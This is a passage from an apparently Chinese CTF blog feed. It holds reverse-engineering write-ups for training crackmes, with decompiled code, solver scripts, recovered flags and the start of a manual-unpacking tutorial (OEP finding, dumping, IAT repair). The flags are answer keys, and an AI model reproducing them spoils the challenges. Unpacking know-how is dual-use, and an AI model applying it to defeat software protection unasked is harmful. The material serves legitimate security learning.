[rsp+90h] [rbp-B0h]  char v23; // [rsp+B0h] [rbp-90h]  unsigned __int64 v24; // [rsp+128h] [rbp-18h]  v24 = __readfsqword(0x28u);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v18, argv, envp);  std::operator&gt;&gt;&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;std::cin, &amp;v18);  v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;-------------------------------------------&quot;);  std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Quote from people&#39;s champ&quot;);  std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  v5 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;-------------------------------------------&quot;);  std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(         &amp;std::cout,         &quot;*My goal was never to be the loudest or the craziest. It was to be the most entertaining.&quot;);  std::ostream::operator&lt;&lt;(v6, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  v7 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;*Wrestling was like stand-up comedy for me.&quot;);  std::ostream::operator&lt;&lt;(v7, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  v8 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(         &amp;std::cout,         &quot;*I like to use the hard times in the past to motivate me today.&quot;);  std::ostream::operator&lt;&lt;(v8, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  v9 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;-------------------------------------------&quot;);  std::ostream::operator&lt;&lt;(v9, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  HighTemplar::HighTemplar((DarkTemplar *)&amp;v23, (__int64)&amp;v18);  v10 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Checking....&quot;);  std::ostream::operator&lt;&lt;(v10, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v19, &amp;v18);  func1((__int64)&amp;v20, (__int64)&amp;v19);  func2((__int64)&amp;v21, (__int64)&amp;v20);  func3((__int64)&amp;v21, 0);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v21);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v20);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v19);  HighTemplar::calculate((HighTemplar *)&amp;v23);  if ( (unsigned int)HighTemplar::getSerial((HighTemplar *)&amp;v23) == 0 )  {    v11 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;/////////////////////////////////&quot;);    std::ostream::operator&lt;&lt;(v11, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    v12 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Do not be angry. Happy Hacking :)&quot;);    std::ostream::operator&lt;&lt;(v12, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    v13 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;/////////////////////////////////&quot;);    std::ostream::operator&lt;&lt;(v13, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    ZN11HighTemplar7getFlagB5cxx11Ev((__int64)&amp;v22, (__int64)&amp;v23);    v14 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;flag{&quot;);    v15 = std::operator&lt;&lt;&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(v14, &amp;v22);    v16 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v15, &quot;}&quot;);    std::ostream::operator&lt;&lt;(v16, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v22);  }  HighTemplar::~HighTemplar((HighTemplar *)&amp;v23);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v18);  return 0;}</code></pre><p>乍一看很复杂，慢慢分析，发现了一个输入，被赋值给了<code>v18</code>，然后发现一个类的构造函数调用了我们输入的字符串，可以理解为，用我们的字符串初始化了类中的数据成员，进去仔细看看</p><pre><code class="c++">nsigned __int64 __fastcall HighTemplar::HighTemplar(DarkTemplar *a1, __int64 a2){  char v3; // [rsp+17h] [rbp-19h]  unsigned __int64 v4; // [rsp+18h] [rbp-18h]  v4 = __readfsqword(0x28u);  DarkTemplar::DarkTemplar(a1);  *(_QWORD *)a1 = &amp;off_401EA0;  *((_DWORD *)a1 + 3) = 0;  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string((char *)a1 + 16, a2);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string((char *)a1 + 48, a2);  std::allocator&lt;char&gt;::allocator(&amp;v3, a2);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(    (char *)a1 + 80,    &quot;327a6c4304ad5938eaf0efb6cc3e53dc&quot;,    &amp;v3);  std::allocator&lt;char&gt;::~allocator(&amp;v3);  return __readfsqword(0x28u) ^ v4;}</code></pre><p>从这里看，类里面至少应该有一个<code>getSerial()</code>函数在<code>off_401EA0</code>处，三个字符串，偏移量分别为16，48，80，长度都是32位，还有一个布尔型变量，偏移量位3，并且我们还知道，我们的数据被传入了一个变量<code>v23</code>里，然后返回去，跟踪<code>v23</code>，找到剩下的关键函数</p><pre><code class="c++">bool __fastcall HighTemplar::calculate(HighTemplar *this){  __int64 v1; // rax  _BYTE *v2; // rbx  bool result; // al  _BYTE *v4; // rbx  int i; // [rsp+18h] [rbp-18h]  int j; // [rsp+1Ch] [rbp-14h]  if ( std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length((char *)this + 16) != 32 )  {    v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Too short or too long&quot;);    std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    exit(-1);  }  for ( i = 0;        i &lt;= (unsigned __int64)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length((char *)this + 16);        ++i )  {    v2 = (_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](                    (char *)this + 16,                    i);    *v2 = (*(_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](                       (char *)this + 16,                       i) ^ 0x50)        + 23;  }  for ( j = 0; ; ++j )  {    result = j &lt;= (unsigned __int64)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length((char *)this + 16);    if ( !result )      break;    v4 = (_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](                    (char *)this + 16,                    j);    *v4 = (*(_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](                       (char *)this + 16,                       j) ^ 0x13)        + 11;  }  return result;}</code></pre><p>这一看就是个加密函数，并且只对偏移量位16处的字符串进行了操作，这里正好是我们输入的字符串，虽然有两个for循环，但是都是对同一个字符串的同一个位置进行操作，很好逆向，加密完之后应该还会有一个验证，找到下面的验证函数</p><pre><code class="c++">__int64 __fastcall HighTemplar::getSerial(HighTemplar *this){  __int64 v1; // rbx  __int64 v2; // rax  __int64 v3; // rax  __int64 v4; // rax  __int64 v5; // rax  unsigned int i; // [rsp+1Ch] [rbp-14h]  for ( i = 0;        (signed int)i &lt; (unsigned __int64)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length((char *)this + 16);        ++i )  {    v1 = *(unsigned __int8 *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](                               (char *)this + 80,                               (signed int)i);    if ( (_BYTE)v1 != *(_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](                                  (char *)this + 16,                                  (signed int)i) )    {      v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;You did not pass &quot;);      v5 = std::ostream::operator&lt;&lt;(v4, i);      std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);      *((_DWORD *)this + 3) = 1;      return *((unsigned int *)this + 3);    }    v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Pass &quot;);    v3 = std::ostream::operator&lt;&lt;(v2, i);    std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  }  return *((unsigned int *)this + 3);}</code></pre><p>这个函数不长，很简单的验证了加密过后的字符串和偏移量位80的字符串是不是一样，用偏移量位3处的布尔值作为返回值，如果相同返回0，回到主函数，接下来就成功了，没有其他的变换和判断，所以这个程序实际上非常简单</p><pre><code class="python">target = &quot;327a6c4304ad5938eaf0efb6cc3e53dc&quot;flag = &#39;&#39;for i in target:    flag += chr((((ord(i) - 11) ^ 0x13) - 23) ^ 0x50)print(flag)</code></pre><p>很简单就可以逆向出，套上<code>flag{}</code>提交即可（这个flag长得实在不像是正确的）</p><pre><code>flag{tMx~qdstOs~crvtwb~aOba}qddtbrtcd}</code></pre><h4 id="re4-unvm-me"><a href="#re4-unvm-me" class="headerlink" title="re4-unvm-me"></a>re4-unvm-me</h4><p>pyc格式，直接uncompyle6反编译，成功，没有对pyc文件动什么手脚，反编译后的源代码如下</p><pre><code class="python">import md5md5s = [ 174282896860968005525213562254350376167, 137092044126081477479435678296496849608, 126300127609096051658061491018211963916, 314989972419727999226545215739316729360, 256525866025901597224592941642385934114, 115141138810151571209618282728408211053, 8705973470942652577929336993839061582, 256697681645515528548061291580728800189, 39818552652170274340851144295913091599, 65313561977812018046200997898904313350, 230909080238053318105407334248228870753, 196125799557195268866757688147870815374, 74874145132345503095307276614727915885]print &#39;Can you turn me back to python ? ...&#39;flag = raw_input(&#39;well as you wish.. what is the flag: &#39;)if len(flag) &gt; 69:    print &#39;nice try&#39;    exit()if len(flag) % 5 != 0:    print &#39;nice try&#39;    exit()for i in range(0, len(flag), 5):    s = flag[i:i + 5]    if int(&#39;0x&#39; + md5.new(s).hexdigest(), 16) != md5s[(i / 5)]:        print &#39;nice try&#39;        exit()print &#39;Congratz now you have the flag&#39;</code></pre><p>发现给出了很多md5，把flag每5个字符一组，算出md5要和给出的相同，所以用这些<a href="https://www.somd5.com/" target="_blank" rel="noopener">md5在线解密</a></p><p>组合起来就是flag</p><pre><code>ALEXCTF{dv5d4s2vj8nk43s8d8l6m1n5l67ds9v41n52nv37j481h3d28n4b6v3k}</code></pre><h4 id="anser-to-everything"><a href="#anser-to-everything" class="headerlink" title="anser_to_everything"></a>anser_to_everything</h4><p>IDA打开</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  int v4; // [rsp+Ch] [rbp-4h]  printf(&quot;Gimme: &quot;, argv, envp);  __isoc99_scanf(&quot;%d&quot;, &amp;v4);  not_the_flag(v4);  return 0;}//not_the_flag__int64 __fastcall not_the_flag(int a1){  if ( a1 == &#39;*&#39; )    puts(&quot;Cipher from Bill \nSubmit without any tags\n#kdudpeh&quot;);  else    puts(&quot;YOUSUCK&quot;);  return 0LL;}</code></pre><p>找到了一个字符串<code>kdudpeh</code>，根据题目提示，sha1加密得<code>80ee2a3fe31da904c596d993f7f1de4827c1450a</code></p><p>套上flag得</p><pre><code>flag{80ee2a3fe31da904c596d993f7f1de4827c1450a}</code></pre><h4 id="elrond32"><a href="#elrond32" class="headerlink" title="elrond32"></a>elrond32</h4><p>IDA打开，main函数如下</p><pre><code class="c++">int __cdecl main(int a1, char **a2){  if ( a1 &gt; 1 &amp;&amp; sub_8048414(a2[1], 0) )  {    puts(unk_80487E4);    sub_8048538((int)a2[1]);  }  else  {    puts(&quot;Access denied&quot;);  }  return 0;}</code></pre><p>我们得输入作为main函数得参数传入，在<code>sub_8048414()</code>函数中进行了一个判断，然后进入<code>sub_8048538()</code>函数处理后输出flag</p><pre><code class="c++">signed int __cdecl sub_8048414(_BYTE *a1, int a2){  signed int result; // eax  switch ( a2 )  {    case 0:      if ( *a1 == &#39;i&#39; )        goto LABEL_19;      result = 0;      break;    case 1:      if ( *a1 == &#39;e&#39; )        goto LABEL_19;      result = 0;      break;    case 3:      if ( *a1 == &#39;n&#39; )        goto LABEL_19;      result = 0;      break;    case 4:      if ( *a1 == &#39;d&#39; )        goto LABEL_19;      result = 0;      break;    case 5:      if ( *a1 == &#39;a&#39; )        goto LABEL_19;      result = 0;      break;    case 6:      if ( *a1 == &#39;g&#39; )        goto LABEL_19;      result = 0;      break;    case 7:      if ( *a1 == &#39;s&#39; )        goto LABEL_19;      result = 0;      break;    case 9:      if ( *a1 == &#39;r&#39; )LABEL_19:        result = sub_8048414(a1 + 1, 7 * (a2 + 1) % 11);      else        result = 0;      break;    default:      result = 1;      break;  }  return result;}</code></pre><p>判断得过程是一个递归，因为返回值要为1，所以递归过程中得每一个if都需要满足，所以很好得到输入的字符串是什么</p><pre><code class="c++">int __cdecl sub_8048538(int a1){  int v2[33]; // [esp+18h] [ebp-A0h]  int i; // [esp+9Ch] [ebp-1Ch]  qmemcpy(v2, &amp;unk_8048760, sizeof(v2));  for ( i = 0; i &lt;= 32; ++i )    putchar(v2[i] ^ *(char *)(a1 + i % 8));  return putchar(10);}</code></pre><p>输出部分只进行了一个很简单的处理，而且不需要逆向，直接用同样的方式处理即可</p><pre><code class="python">targrt = &#39;ie_ndags_r&#39;f = &#39;&#39;j = 0for i in range(8):    f += targrt[j]    j = 7 * (j + 1) % 11# print(f)flag = &#39;&#39;a2 = [0x0F, 0x1F, 0x04, 0x09, 0x1C, 0x12, 0x42, 0x09, 0x0C, 0x44, 0x0D, 0x07, 0x09, 0x06, 0x2D,      0x37, 0x59, 0x1E, 0x00, 0x59, 0x0F, 0x08, 0x1C, 0x23, 0x36, 0x07, 0x55, 0x02, 0x0C, 0x08,      0x41, 0x0A, 0x14]for i in range(33):    flag += chr(a2[i] ^ ord(f[i % 8]))print(flag)</code></pre><p>输出flag</p><pre><code>flag{s0me7hing_S0me7hinG_t0lki3n}</code></pre>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>攻防世界</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-re部分题解（一）</title>
    <link href="/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>攻防世界的题目质量还是比较高的，题目类型很多，难度也有一定的梯度，挺适合不断进阶学习。</p><a id="more"></a><h4 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h4><p>IDA打开，进入main，发现程序在生成随机数，然后随便输出一系列字符串中的某一个，找到这一系列字符串，发现了flag</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  unsigned int v3; // eax  unsigned int v4; // eax  puts(&quot;Reticulating splines, please wait..&quot;);  sleep(5u);  v3 = time(0);  srand(v3);  v4 = rand();  puts((&amp;strs)[v4 % 0xA]);  return 0;}</code></pre><p>找到strs，其中flag</p><pre><code>9447{This_is_a_flag}</code></pre><h4 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h4><p>这题真就连源代码都给了</p><pre><code class="c++">#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[]) {    if (argc != 4) {        printf(&quot;what?\n&quot;);        exit(1);    }    unsigned int first = atoi(argv[1]);    if (first != 0xcafe) {        printf(&quot;you are wrong, sorry.\n&quot;);        exit(2);    }    unsigned int second = atoi(argv[2]);    if (second % 5 == 3 || second % 17 != 8) {        printf(&quot;ha, you won&#39;t get it!\n&quot;);        exit(3);    }    if (strcmp(&quot;h4cky0u&quot;, argv[3])) {        printf(&quot;so close, dude!\n&quot;);        exit(4);    }    printf(&quot;Brr wrrr grr\n&quot;);    unsigned int hash = first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207;    printf(&quot;Get your key: &quot;);    printf(&quot;%x\n&quot;, hash);    return 0;}</code></pre><p>看一下源码，发现运行时要有三个参数，第一个参数给出来了，是0xcafe，第二个没有给，但是知道second%17==8，直接带到下面计算就行了，第三个是字符串的长度，为7，直接算出来就行了。</p><p>不过还需要注意，最后输出的时候是以16进制的形式输出</p><pre><code>c0ffee</code></pre><h4 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple-unpack"></a>simple-unpack</h4><p>题如其名，拿到直接upx脱壳，毫无阻碍，IDA打开直接在main里看到flag</p><pre><code>flag{Upx_1s_n0t_a_d3liv3r_c0mp4ny}</code></pre><h4 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h4><p>IDA打开，找到关键判断位置</p><pre><code class="c++">strcpy(v8, &quot;:\&quot;AL_RT^L*.?+6/46&quot;);  v7 = &#39;ebmarah&#39;;  v6 = 7;  printf(&quot;Welcome to the RC3 secure password guesser.\n&quot;, a2, a3);  printf(&quot;To continue, you must enter the correct password.\n&quot;);  printf(&quot;Enter your guess: &quot;);  __isoc99_scanf(&quot;%32s&quot;, s);  v3 = strlen(s);  if ( v3 &lt; strlen(v8) )    sub_4007C0(v8);  for ( i = 0; i &lt; strlen(s); ++i )  {    if ( i &gt;= strlen(v8) )      ((void (*)(void))sub_4007C0)();    if ( s[i] != (char)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )      ((void (*)(void))sub_4007C0)();  }</code></pre><p>v7本身是一个长整型，但是作为字符读取，由于小端序，所以转换成的字符要反序，然后经过下面的计算就可以了</p><pre><code class="python">v8 = &#39;:\&quot;AL_RT^L*.?+6/46&#39;v7 = &#39;harambe&#39;s = &#39;&#39;for i in range(len(v8)):    s += chr(ord(v7[i % 7]) ^ ord(v8[i]))print(s)</code></pre><p>输出结果</p><pre><code>RC3-2016-XORISGUD</code></pre><h4 id="python-trade"><a href="#python-trade" class="headerlink" title="python-trade"></a>python-trade</h4><p>见CG-CTF py交易</p><h4 id="game"><a href="#game" class="headerlink" title="game"></a>game</h4><p>见BUGKU 游戏过关</p><h4 id="hello-ctf"><a href="#hello-ctf" class="headerlink" title="hello-ctf"></a>hello-ctf</h4><p>一串输入的字符串拷贝来拷贝去，实际上就是把输入的字符串变成16进制，所以直接从16进制转换成字符串就可以了</p><pre><code class="python">s = &#39;437261636b4d654a757374466f7246756e&#39;flag = bytes.fromhex(s)print(flag)</code></pre><p>直接输出flag</p><pre><code>CrackMeJustForFun</code></pre><h4 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h4><p>同样是一道简单题，写个简单的逆运算就可以了</p><pre><code class="python">s = &#39;c61b68366edeb7bdce3c6820314b7498&#39;t = &#39;&#39;v5 = 0while (v5 &lt; len(s)):    if (v5 &amp; 1):        v3 = 1    else:        v3 = -1    t += chr(ord(s[v5]) + v3)    v5 = v5 + 1t=&#39;SharifCTF{&#39;+t+&#39;}&#39;print(t)</code></pre><p>输出flag</p><pre><code>SharifCTF{b70c59275fcfa8aebf2d5911223c6589}</code></pre><h4 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h4><p>IDA打开追踪字符串，发现flag和输入直接进行比较，找到flag的位置，然后将16进制转换位字符串然后逆序即可</p><pre><code>DUTCTF{We1c0met0DUTCTF}</code></pre><h4 id="no-strings-attached"><a href="#no-strings-attached" class="headerlink" title="no-strings-attached"></a>no-strings-attached</h4><p>这题有点意思，整个程序没有直接出现的字符串，先打开IDA看看，找到一个decrypt函数，一看就知道这个是最重要的部分，又不想再写脚本去算，所以干脆开虚拟机gdb动态调试，在decrypt处下断点，等运行完decrypt函数之后，发现程序把某个地址拷进了eax，所以用<code>x/6sw $eax</code>来查看，结果发现了flag</p><pre><code>9447{you_are_an_international_mystery}</code></pre><h4 id="csaw2013reversing3"><a href="#csaw2013reversing3" class="headerlink" title="csaw2013reversing3"></a>csaw2013reversing3</h4><p>这题比较有意思，一打开输出的是乱码，用IDA打开发现这些代码没有解密，有一个解密程序但是没有运行，所以OD直接调试改汇编，先运行解密函数，然后跳转到MessageBoxA函数，在窗口中输出来的就是真正的flag，操作比较简单，就不赘述了。</p><pre><code>flag{reversing_is_not_that_hard!}</code></pre><h4 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h4><p>见CG-CTF maze</p><h4 id="666"><a href="#666" class="headerlink" title="666"></a>666</h4><p>IDA打开看到了假flag，不管它，找到关键函数</p><pre><code class="c++">int __fastcall encode(const char *a1, __int64 a2){  char v3[32]; // [rsp+10h] [rbp-70h]  char v4[32]; // [rsp+30h] [rbp-50h]  char v5[40]; // [rsp+50h] [rbp-30h]  int v6; // [rsp+78h] [rbp-8h]  int i; // [rsp+7Ch] [rbp-4h]  i = 0;  v6 = 0;  if ( strlen(a1) != key )    return puts(&quot;Your Length is Wrong&quot;);  for ( i = 0; i &lt; key; i += 3 )  {    v5[i] = key ^ (a1[i] + 6);    v4[i + 1] = (a1[i + 1] - 6) ^ key;    v3[i + 2] = a1[i + 2] ^ 6 ^ key;    *(_BYTE *)(a2 + i) = v5[i];    *(_BYTE *)(a2 + i + 1LL) = v4[i + 1];    *(_BYTE *)(a2 + i + 2LL) = v3[i + 2];  }  return a2;}</code></pre><p>这里进行了一些运算，运算的结果要和一个已经定义的enflag字符串相同，所以很好逆，这里需要注意运算顺序，异或运算加括号，不然会先计算加减</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() {    int key = 0x12;    unsigned char a2[] =            {                    0x69, 0x7A, 0x77, 0x68, 0x72, 0x6F, 0x7A, 0x22, 0x22, 0x77,                    0x22, 0x76, 0x2E, 0x4B, 0x22, 0x2E, 0x4E, 0x69            };    char a1[key+1];    for (int i = 0; i &lt; key; i += 3 )    {        a1[i]=(a2[i]^key)-6;        a1[i+1]=(a2[i+1]^key)+6;        a1[i+2]=a2[i+2]^key^6;    }    cout&lt;&lt;a1&lt;&lt;endl;    return 0;}</code></pre><p>输出的flag为：</p><pre><code>unctf{b66_6b6_66b}</code></pre><h4 id="Reversing-x64Elf-100"><a href="#Reversing-x64Elf-100" class="headerlink" title="Reversing-x64Elf-100"></a>Reversing-x64Elf-100</h4><p>没什么难度，找到关键函数</p><pre><code class="c++">signed __int64 __fastcall sub_4006FD(__int64 a1){  signed int i; // [rsp+14h] [rbp-24h]  const char *v3; // [rsp+18h] [rbp-20h]  const char *v4; // [rsp+20h] [rbp-18h]  const char *v5; // [rsp+28h] [rbp-10h]  v3 = &quot;Dufhbmf&quot;;  v4 = &quot;pG`imos&quot;;  v5 = &quot;ewUglpt&quot;;  for ( i = 0; i &lt;= 11; ++i )  {    if ( (&amp;v3)[i % 3][2 * (i / 3)] - *(char *)(i + a1) != 1 )      return 1LL;  }  return 0LL;}</code></pre><p>a1就是我们需要的flag了</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() {    char v3[3][8] = {&quot;Dufhbmf&quot;, &quot;pG`imos&quot;, &quot;ewUglpt&quot;};    char a1[13];    for (int i = 0; i &lt;= 11; ++i) {        a1[i] = v3[i % 3][2 * (i / 3)] - 1;    }    cout&lt;&lt;a1&lt;&lt;endl;    return 0;}</code></pre><p>输出的flag为：</p><pre><code>Code_Talkers</code></pre>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>攻防世界</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-crackme-wp（手动脱壳）</title>
    <link href="/2020/02/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-crackme-wp%EF%BC%88%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3%EF%BC%89/"/>
    <url>/2020/02/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-crackme-wp%EF%BC%88%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>这里以攻防世界的一道简单的题目来记录一下手动脱壳相关内容，其实理解了原理之后也是非常简单的一件事。</p><a id="more"></a><p>首先看看攻防世界的这道crackme。</p><h4 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h4><p>PEiD查一查，发现有壳，nSpack，并不是常见的upx，也懒得去找工具，这样一道简单的题目肯定不会用很复杂的壳，所以开始徒手脱壳。</p><p><img src="https://s2.ax1x.com/2020/02/20/3eQuwV.png" srcset="/img/loading.gif" alt="crackme-1"></p><h4 id="找OEP"><a href="#找OEP" class="headerlink" title="找OEP"></a>找OEP</h4><p>手动脱壳的第一步，就是要找到程序的OEP，就是真正的程序入口点。这个要从壳的原理说起，所谓的压缩壳、加密壳，作用都是要隐藏程序真正的入口点，在壳加载的过程中对数据进行解压和解密并放到相应的段，然后壳的作用就结束了，这个时候会从壳进入真正的程序，这个时候会有一个真正的程序入口，就是OEP，不管脱什么壳，首先都是要找到OEP。</p><p>首先OD打开调试（不管用什么调试都差不多，IDA也是可以的，并且也有相应的Dump脚本，过程上没什么太大的差别）</p><p><img src="https://s2.ax1x.com/2020/02/20/3eJESU.png" srcset="/img/loading.gif" alt="crackme-2"></p><p>首先看到<code>pushfd</code>和<code>pushad</code>两条命令，这是记录所有寄存器，这里我根据<em>esp定律</em>，实际上也就是堆栈平衡的原理，在执行完<code>pushad</code>之后对<code>esp</code>下断点</p><p><img src="https://s2.ax1x.com/2020/02/20/3eJFYV.png" srcset="/img/loading.gif" alt="crackme-3"></p><p>下面简单介绍一下<em>esp定律</em>：</p><blockquote><p>一般的加壳软件在执行时，首先要初始化，保存环境（保存各个寄存器的值），一般利用<code>pushad</code>（相当于把<code>eax,ecx,edx,ebx,esp,ebp,esi,edi</code>都压栈），当加壳程序的外壳执行完毕以后，再来恢复各个寄存器的内容，通常会用POPAD（相当与把刚刚保存的寄存器的值都还原），在脱壳的时候，我们可以根据堆栈平衡来对ESP进行下断，进而快速到达OEP</p></blockquote><p>使用硬件读断点（<code>hw esp</code>），这里只经过了两次跳转，然后就来到了OEP附近，这里也需要注意，OEP处的<code>esp</code>并不一定是之前记录的值，但是一定很近了，这个时候需要耐心的寻找疑似的OEP。这里的OEP我找到实在<code>0x401000</code>处</p><p><img src="https://s2.ax1x.com/2020/02/20/3eJkWT.png" srcset="/img/loading.gif" alt="crackme-4"></p><p>这里显然就是程序真正的入口。还有一点需要注意，壳加载过程中会加载代码，所以如果遇到没有解析的数据，就<code>Ctrl+A</code>重新分析代码。</p><h4 id="Dump"><a href="#Dump" class="headerlink" title="Dump"></a>Dump</h4><p>接下来要把内存中的完整程序Dump出来，好像OD有相关的插件，但我还是喜欢LordPE，使用也很简单，就是注意右键进程，修正镜像大小，因为有人会改镜像的大小，Dump出来的程序会有问题，所以一般不去判断，直接先修正，再Dump</p><h4 id="修正IAT"><a href="#修正IAT" class="headerlink" title="修正IAT"></a>修正IAT</h4><p>这个时候Dump出来的程序时没法运行的，因为缺少了很关键的一部分内容，就是IAT，也就是输入表，我们可以把现在Dump出来的程序用IDA打开，可以看到<code>printf</code>和<code>scanf</code>之类的函数都识别不出来，这就是因为我们Dump出来的程序没有输入表。至于输入表是什么，偷懒从百度百科抄了过来，这是PE结构中很重要的一部分。</p><blockquote><p>Import Address Table 由于导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个DLL 中。当PE 文件被装入内存的时候，Windows 装载器才将DLL 